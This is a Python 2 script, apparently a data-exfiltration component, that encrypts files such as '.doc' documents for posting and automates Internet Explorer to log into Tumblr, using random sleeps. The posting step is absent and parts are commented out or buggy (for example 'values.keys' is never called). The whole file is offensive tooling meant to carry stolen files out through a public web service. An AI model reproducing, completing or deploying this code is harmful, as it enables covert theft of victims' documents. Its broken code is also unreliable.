'''exfiltrate encrypted data'''
import util

#import win32com.client
import os
import fnmatch
import time
import random
#import zlib


PUBLIC_KEY = ''

def wait_for_browser(browser):
    '''wait for the broswer to do its thing'''
    ready_states = [4, 'complete']
    while browser.ReadyState not in ready_states:
        time.sleep(0.1)
    return

def readfile(filename, mode='r'):
    '''get key from file'''
    result = ''
    try:
        infile = open(filename, mode=mode)
        result = infile.read()
    finally:
        infile.close()
    return result
def encrypt_post(filename, key=None):
    '''encrypt the file for posting'''
    if key is None:
        key = PUBLIC_KEY
    enc = util.Encryption()

    contents = readfile(filename, 'rb')
    enc_title = enc.encrypt_string(key, filename)
    enc_body = enc.encrypt_string(key, contents)
    return enc_title, enc_body
def random_sleep(min_seconds=5, max_seconds=10):
    '''sleep for a random amount of time between min and max seconds'''
    time.sleep(random.randint(min_seconds, max_seconds))
    return
def login_to_tumblr(ie, values):
    '''log into tumblr'''
    # retrieve full contents of document
    full_doc = ie.Document.all

    #iterate looking for the login form
    for i in full_doc:
        if i.id in values.keys:
            i.setAttribute('value', values[i.id])

    random_sleep()

    try:
        if ie.Document.forms[0].id != 'signup_form':
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError, err:
        print str(err)

    random_sleep()

    wait_for_browser(ie)
    return

def main():
    '''main'''
    global PUBLIC_KEY
    PUBLIC_KEY = readfile(filename='pub.key')
    priv_key = readfile(filename='priv.key')

    doc_types = ['.doc']

    try:
        infile = open('kvps.txt')
        lines = infile.readlines()
    finally:
        infile.close()

    #util.test_encryption((PUBLIC_KEY, priv_key), verbosity=0)
    login_values = {
        'url' : str.strip(lines[0]),
        'signup_email' : str.strip(lines[1]),
        'signup_password' : str.strip(lines[2])
    }
    for k, v in login_values.iteritems():
        print "%s : %s" % (k,v)


    #test_login(login_values)
def test_login(values):
    ie = win32com.client.Dispatch('InternetExplorer.Application')
    ie.Visible = 1
    ie.Navigate(values['url'])
    wait_for_browser(ie)
    print 'Logging into tumblr...'
    login_to_tumblr(ie, values)
    print 'Logged in.'
    

if __name__ == '__main__':
    main()
